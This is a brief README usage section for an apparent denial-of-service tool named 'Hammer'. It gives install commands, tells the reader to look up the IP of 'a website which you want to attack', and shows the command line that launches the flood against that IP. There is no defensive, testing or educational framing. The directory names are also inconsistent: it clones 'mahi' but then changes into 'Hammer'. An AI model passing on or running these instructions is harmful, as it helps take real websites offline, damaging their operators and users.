## Usage:
```
$ apt update
$ apt upgrade
$ apt install python
$ apt install git
$ apt install dnsutils
$ git clone https://github.com/mahivaiking/mahi/

Hammer need the Name Server of a website which you want to attack...
To get the Name Server...just type
$ nslookup example.com
Note the IP Address of that Website

then
$ cd Hammer
$ python3 mahi.py -s [ip Address] -t 135
example:
$ python3 mahi.py -s 123.45.67.89 -t 135
```



